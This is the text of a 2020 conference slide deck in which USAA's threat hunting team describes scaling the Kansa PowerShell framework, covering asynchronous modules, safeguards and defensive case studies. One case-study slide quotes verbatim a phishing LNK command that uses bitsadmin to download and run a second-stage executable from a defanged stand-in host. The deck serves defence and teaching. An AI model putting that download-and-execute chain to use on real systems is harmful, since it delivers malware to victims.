20 Jun 2020
Kansa@Scale Enterprise Threat Hunting
USAA Threat Hunting Team Open-Source Contribution
Jon Ketchum Threat Hunter USAA Cyber Threat Ops Center
1

OUR MISSION
The mission of the association is to facilitate the financial security of its members, associates and their families through provision of a full range of highly competitive financial products and services; in so doing, USAA seeks to be the provider of choice for the military community.

THE USAA STANDARD
· Keep our membership and mission first · Live our core values: Service, Loyalty,
Honesty, Integrity · Be compliant and manage risk · Build trust and help each other succeed · Embrace diversity and be purposefully
inclusive · Innovate and build for the future

2

Kansa@Scale ­ Enterprise Threat Hunting
Refresher: What is Kansa? Pre-requisites & Limitations
Journey of Creative Solutions
 Distributed Parallel Deployment  ELK Integration for Centralized Collection  Asynchronous Execution (Fire&Forget)  Avoiding Alert Generation  Safeties/Metrics/Monitoring  Just-In-Time Module Assembly  PullBin via Necromancer  LaunchPad
New Modules / Case Studies
3

Refresher: What is Kansa?
Need to run arbitrary powershell scripts on remote hosts for Threat Hunting/IR?
 Modular Powershell Framework (v2 compatible)  Incident Response / Threat Hunting  Run triage/forensic collection scripts on targets  Custom & Community-provided modules  Includes Analysis Scripts
4

Pre-requisites
 Powershell  WinRM port 5985/5986  Credentials  RSAT  ELK  Deployment Server(s)  Staging Server(s) with REST API
 (and load balancer?)
5

Kansa Limitations

 Can't-sa?
 Limited to 50-100 targets  Analyst workstation network bottleneck  Job-timeout, long-running jobs  Results stored on local disk

6

Limitation: Serial deployment
7

First Challenge
Where Kansa excels: run handful of modules on 20-30 systems Our Desire: Run 1 module on 150K+ systems Limitation: Runs too slow, especially on long-modules
8

Solution: Distributed Deployment & Centralized Logging 2
1
...
1. Distribute job/targets to Kansa-Servers 2. Kansa-Servers connect to targets, execute job, collect results
9

Solution: Distributed Deployment & Centralized Logging 3
...

4

3. Servers send errors & results to ELK

4. Analyst performs analysis via ELK dashboards/aggregations/viz

10

Not enough
Success: Running on 100K+ systems with centralized results Limitation: Still bottlenecks on synchronous module-duration
11

Fire & Forget Modules
Our solution: Async jobs, Orphaned child process, self-reporting to ELK Collect/Format/Standardize results Send results to ELK <MODULE CODE> Compress & Base64 encode module Spawn orphaned-child PS process Include self-unpacker Report Target, Child PID
12

Fire & Forget Modules
Our solution: Async jobs, Orphaned child process, self-reporting to ELK Collect/Format/Standardize results Send results to ELK <MODULE CODE> Compress & Base64 encode module Spawn orphaned-child PS process Include self-unpacker Report Target, Child PID
13

Asynchronous Deployment/Collection
...
1. Fabricate the Fire&Forget module, deploy it to the servers 14

Asynchronous Deployment/Collection

...

Realtime Analysis

2. Deploy to endpoints, results sent to ELK immediately

15

I am my own worst enemy
Success: Centralized Command/Control, Decentralized execution Limitation: Now we look like malware
You were supposed to destroy them
Not Join them! 16

I am my own worst enemy
Success: Centralized Command/Control, Decentralized execution Limitation: Now we look like malware
17

Safewords, Burner Creds, & SOAR check-ins - Oh My!

EDR

Password Vault API

SOAR API

API Key + Approved Src + Burner acct + Approved alerts
= Okay

...

Analyst Workstation
18

We've Gone To Plaid
Success: Achieved Ludicrous speed Limitation: Tipping over services (especially in VDI)
Disk I/O CPU Network Bandwidth RAM
19

VDI ­ Unique Considerations
Most workstations spend most of the time idle ­ wasting resources
20

VDI ­ Unique Considerations
Consolidate and share fewer resources Dynamically reallocate on-demand
21

Hunting in VDI - Before
Rapid simultaneous scan Resource bottlenecking
22

Kansa Fire&Forget Safeguards

Pre-launch checklist

Notifications

Staggered Execution

Killswitch timer

Abort-Function

CPU Limiter
Performance Metrics
23

Kill-Switch
24

Staggered Start, CPU Throttle
25

Abort-Launch and D-Launcher

Get-AbortCleanKansaServersFF.ps1
· Terminate in-progress deployment · Bounce services · Send partial results · Remove temp files/results

Get-KansaDLauncherFF.ps1
· Terminate Kansa job on endpoints
· Report success

26

Hunting in VDI v2.0
+ Physical
Results: · Deploy script to 150K+ endpoints in < 5min · Script w/ avg runtime of 5min/endpoint · Spread execution over 0  24hrs as desired · Job survives sleep/hibernation
· Recalculates runtime to subtract naptime · 500M+ records collected per day · Can deploy overlapping jobs simultaneously
· Jobs distinguished by HuntID parameter · No resource exhaustion (CPU/DiskIO/Network)
· Recently added RAM safeties
27

Fire & Forget Modules Getting Unwieldy
Success: Safe Fast Scalable Kansa Jobs Limitation: Fire & Forget Runtime Parameters are Static Limitation: Fire & Forget Modules are HUGE
Autonomous ELK Reporting Helper Functions Alert-Suppression Safety Mechanisms Metrics ...oh, and actual module code
28

Just-In-Time Kansa Modules
FFwrapper Integrated Helper Functions Record-Transmission Functions Safeword/Alert-Suppression Safety Mechanisms Metrics ...oh, and Actual module code
29

Just-In-Time Kansa Modules
FFwrapper Integrated Helper Functions Record-Transmission Functions Safeword/Alert-Suppression Safety Mechanisms Metrics

Actual module code

30

Just-In-Time Kansa Modules
FFwrapper Integrated Helper Functions Record-Transmission Functions Safeword/Alert-Suppression Safety Mechanisms Metrics ...oh, and Actual module code

FF Development Template Stub helper functions (Add-Result prints to screen)

31

Just-In-Time Kansa Modules
FFwrapper Integrated Helper Functions Record-Transmission Functions Safeword/Alert-Suppression Safety Mechanisms Metrics

FF Development Template Stub helper functions (Add-Result prints to screen) Actual module code

32

Just-In-Time Kansa Modules
Integrated Helper Functions Record-Transmission Functions Safeword/Alert-Suppression Safety Mechanisms Metrics ...oh, and Actual module code
33

At Launch Time...
FFwrapper Integrated Helper Functions Record-Transmission Functions Safeword/Alert-Suppression Safety Mechanisms Metrics

Actual module code

34

At Launch Time...
Dynamically Generated Fire & Forget Module Integrated Helper Functions Record-Transmission Functions Safeword/Alert-Suppression Parse/transcribe runtime variables Actual module code Safety Mechanisms Metrics
35

Code Snippets
36

Code Snippets
37

Code Snippets
38

Code Snippets
39

Code Snippets
40

Code Snippets
41

Code Snippets
42

Code Snippets
43

Helper Functions
Add-Result / Send-Results Get-LastLoggedOnUser enhancedGCI Get-FileDetails (MACB, hashes, content, magicbytes) Get-StringHash Get/Send-file Notify-Helpdesk
44

Metrics Collected
MinutesRuntime HostUptimeDays LastLoggedOnUser Info HostOS Name, Version, Bitness, InstalledDate, CurrentTime, LastBootDateTime Physical Memory, Module Shared Memory, Module Private Memory Module PID, Process-Bitness, CPUTime, Account-Context DelayedStartSeconds, ModuleRuntime, TotalDuration, TimeSlept Number records added
45

Safety Mechanisms Included In Wrapper
Helpdesk Alert Staggered Execution Killswitch VDI abort criteria CPU Limiter
46

Sample Launch Sequence
47

48

49

ELK Telemetry
50

Pushbin Doesn't Scale at High Speed
Limitation: using Kansa servers to PUSH binaries at launch is too slow SOLUTION:
Create Cluster of REST API webservers fronted by load-balancer Have Fire&Forget agents PULL tools from the client side "Tactical" installs of sysmon, winlogbeat, etc. "Necromancer" server cluster
51

Necromancer Server Cluster
...
52

Using New Features
Kansa.ps1 -ElkAlert @("192.168.0.31","192.168.0.32") -ElkPort @(1337) -FireForget -FFwrapper ".\Modules\FireForget\FFwrapper.ps1" -FFArgs @{delayedStart = $true; maxDelay = 3600; killSwitch = $true; killDelay = 1800; VDIcheck = $false; CPUpriority = "Idle" } -FFStagePath ".\Modules\FFStaging\" -SafeWord "pineapple"
53

Using New Features
DistributedKansa.ps1 -KansaServers ".\kansa_servers.txt" -KansaRemotePath "C:\Kansa\" -Overwrite -NoPrompt
54

Using New Features
GetTargets.ps1 -HostnameRegex "WS[0-9]{10}" -LastLogonLessThanDaysAgo 30 -ActiveDirectorySearchBase "OU=Workstations,dc=corp,dc=com" -Randomize -outFile ".\targets.txt"
55

Launch Commandline is Too Long
Limitation: Launch command is too long
56

Launch Commandline is Too Long
Limitation: Launch command is too long
57

Launch Commandline is Too Long
Limitation: Launch command is too long SOLUTIONS:
Set default values in FFwrapper LaunchPad.ps1 script
Interactive prompts Automatic target-list collection Default values for common modules Draft email/slack notifications
58

Launch Commandline is Too Long
Limitation: Launch command is too long SOLUTIONS:
Set default values in FFwrapper LaunchPad.ps1 script
Interactive prompts Automatic target-list collection Default values for common modules Draft email/slack notifications
59

Some Fire&Forget Modules
Get-ADSFF.ps1 Get-DDEFilesFF.ps1 Get-ImageExecutionGlobalFlagFF.ps1 Get-MSOfficeXMLFF.ps1 Get-SchTasksFF.ps1 Get-SQLDBFF.ps1 Get-WinEventsFF.ps1 Get-WMIscriptsFF.ps1
60

Case Studies
CASE STUDIES
61

Case Study ­ System32 Outliers
Source: Ad-Hoc / Topic / Theory Tactic: Hide malware in trusted folder Primary Tool: Kansa (alternate tools: EDR, Asset-mngmt) · Enumerate all files in System32 folder · Collect all metadata, incl file hash & digital signature · LFO by Filename, Hash, Creation Date/time · Pivot to outliers by aggregate name & hash Output: · utilman.exe, f5ae03de0ad60f5b17b82f2cd68402fe (cmd.exe) · Remedial training, new detections/signatures
62

Case Study ­ Project Necromancer
Source: Intel team request Tactic: Malicious binaries Primary Tools: Kansa, AssemblyLine, Python REST/webserver · Enum all .exe files, Collect ALL the metadataz · "Unknown" binaries  malware pipeline · Static & Dynamic Analysis Outputs: · Analyzed 450K+ unique binaries · Found mostly PUPs, policy violations · Metadata for other case enrichments
63

Case Study ­ Failed Phishing Campaign
Source: CIRT & Intel Tactic: Phishing with multilayer obfuscated attachment Primary Tool: Kansa · Darkcomet malware campaign blocked by email security · Zip w/ LNK used bitsadmin.exe to download 2nd stage
· ..\..\..\Windows\System32\cmd.exe /c "bitsadmin /reset&bitsadmin /create ""&bitsadmin /addfile "" "hxxp://www.evildomain.com/cis/scanvoi.exe" "%tmp%\tmeepfile.exe"&bitsadmin /setproxysettings "" NO_PROXY&bitsadmin /setnotifyflags "" 1&bitsadmin /setnotifycmdline "" "%comspec%" "/c bitsadmin /complete \"\"&start \"\" \"%tmp%\tmeepfile.exe\""&bitsadmin /resume """
Outputs: · Detection bitsadmin reaching out to internet · Hunt module to inspect LNK targets
64

Case Study ­ Evil Chrome Extensions Source: AppSec Tactic: Malicious Browser Extension Primary Tool: Kansa · Enumerate all plugins by GUID per-user · Enrich data with manifest info and display name lookup Outputs: · Found users with hacked/malicious extensions. #Removed · Chrome Extension baseline & whitelist policy
65

Case Study ­ FIN7 Artifact Detection (FAD)
Source: Intel team Tactic: Execution with batch file in user's temp profile folder · Malware leaves bat, cs, cmdline files in %TEMP% and
ProgramData Primary Tool: Kansa · Enumerate all bat/cs/cmdline files in target folders · Collect metadata, hashes, file-content Outputs: · Found Go2Assist Corporate usage
66

Case Study ­ Local Admins
Source: Ad-Hoc / Topic theory Tactic: Persistence by creating local accounts outside of AD Primary Tool: Kansa · Enumerate Local Users & Groups · Focus on Local Administrators Outputs: · Found policy violations · New detection (winlogbeat add user via gui vs just cmd line)
67

Case Study ­ Unusual Services
Source: Ad-Hoc / Topic Theory Tactic: Persistence or PrivEsc through service creation or hijacking Primary Tool: Kansa · Sc query · LFO Outputs: · Found teamviewer, telnet svr, vnc, and Zune????
68

Case Study - PrintMonitors
Source: Red Team & MITRE ATT&CK Tactic: Persistence and PrivEsc with Print job monitor DLLs Primary Tool: Kansa · Enumerate all PrintMonitor registry keys · Parse target dlls / Path · Gather file metadata (incl hashes) · Enrich with file-reputation service Outputs: · Recurring PrintMonitor persistence/privesc hunt
69

Case Study - Certstore Source: Ad-Hoc / Topic Theory Tactic: Use Rogue Installed Certs to trust evil code or websites Primary Tool: Kansa · Collect all certs from Windows & Java certstores · Outlier analysis Outputs: · Revoked certs still in local cert store
70

Case Studies ­ Agent Presence
Source: Ad-Hoc / Topic Theory Tactic: Disable endpoint security tools to avoid detection Primary Tool: Kansa · Enumerate all running processes/svcs and installed apps · Check for presence of security tools · Report dormant/missing tools Outputs: · List of machines not getting updates/packages · Agent inadvertently excluded from gold image
71

Case Studies ­ MBR variations Source: Ad-Hoc / Topic Theory Tactic: MBR root/bootkit loads before OS to hide from kernel Primary Tool: Kansa · Grab first 400 bytes of the system drive Outputs: · Out of ~100K workstations, only 8 outliers · All were SSDs used a specific version of drive-copy software · MBR baseline for future (repeatable) MBR hunts
72

Case Studies ­ Frozen Python
Source: Red Team Tactic: compiled/bundled Python executable Primary Tool: Kansa, Sysmon/EDR · Gather samples of Python EXEs
· (Py2exe, cx_freeze, PyInstaller, etc...)
· Look for common artifacts · Sweep environment to determine prevalence of indicator · Investigate hits Outputs: · Realtime detection for "Frozen" Python in our EDR
73

Case Studies ­ Uncommon Drivers
Source: Hunt Hypothesis Tactic: Persistence through malicious driver Primary Tool: Kansa · Enumerate ALL drivers on EVERY system · Aggregate by filename/SHA256/path/MACB-times/etc Outputs: · Unapproved software/hardware installations · WinPmem (on forensics' team systems) · Hauppauge WinTV PVR · "clumsy" windivert
74

Questions?
75

76

